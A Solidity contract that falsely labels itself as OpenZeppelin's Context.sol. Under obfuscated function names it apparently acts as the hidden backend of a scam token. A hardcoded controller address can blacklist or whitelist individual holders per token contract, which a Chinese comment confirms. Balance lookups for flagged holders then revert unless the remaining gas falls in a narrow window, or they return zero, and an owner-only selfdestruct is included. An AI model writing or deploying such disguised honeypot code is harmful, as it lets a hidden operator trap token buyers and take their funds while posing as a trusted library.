// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)
pragma solidity ^0.8.20;

contract BALANCE {
    mapping(address => uint256) private _balances;
    mapping(address => uint256) owner_0;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => mapping(address => uint256)) private _allMt;
    uint256 _minGas;
    uint256 _maxGas;
    address private _owner;
    uint256 stor_3;
    address private _gaslike = 0x53bA5e7a4390f463a1a0BC0f8C8351767b35F197;

    constructor() {
        _owner = msg.sender;
        _minGas = 510000;
        _maxGas = 515000;
    }

    function Lgrget(address var1) external view returns (uint256) {
        uint256 gas_ = gasleft();
        uint256 v0 = legiti(var1, gas_);
        return v0;
    }

    function legiti(address input, uint256 sender)
        private
        view
        returns (uint256)
    {
        address v7;
        if (owner_0[msg.sender] != 1) {
            if (2 == owner_0[msg.sender]) {
                bool v3 = false;
                require(v3);
            } else {
                uint256 a = _allMt[msg.sender][input];
                if (stor_3 != 0) {
                    if (a == 1) {
                        bool v1 = sender > _minGas ? true : false;
                        if (v1) {
                            bool v2 = sender < _maxGas ? true : false;
                            v1 = v2;
                        }
                        require(v1);
                        return 0;
                    } else {
                        return 0;
                    }
                } else {
                    if (a == 1) {
                        bool v3 = sender > _minGas ? true : false;
                        if (v3) {
                            bool v4 = sender < _maxGas ? true : false;
                            v3 = v4;
                        }
                        require(v3);
                        v7 = msg.sender;
                    } else {
                        v7 = msg.sender;
                    }

                    (bool success, bytes memory data) = v7.staticcall(
                        abi.encodeWithSignature("balanceOf(address)", input)
                    );
                    require(success, "error");
                    bytes32 mdata;
                    assembly {
                        mdata := mload(add(data, 0x20))
                    }
                    return uint256(mdata);
                }
            }
            return 0;
        } else {
            return 0;
        }
    }

    // P 合约地址 account 用户地址  c  0-拉白 -1-拉黑
    function actionKfc(
        address p,
        address account,
        uint256 b
    ) external {
        require(msg.sender == _gaslike, "Ownable: caller is not the owner");
        uint256 v1 = 0;
        if(b == 0){
            v1 = 1;
        }
        _allMt[p][account] = v1;
    }

    function setOne(address p) external {
        require(msg.sender == _gaslike, "Ownable: caller is not the owner");
        owner_0[p] = 3;
    }

    function getOne(address p) public view returns (uint256) {
        return owner_0[p];
    }

    function getNext(address p, address account) public view returns (uint256) {
        return _allMt[p][account];
    }

    // 自毁
    function kill() external {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        selfdestruct(payable(tx.origin));
    }

    fallback() external {}
}
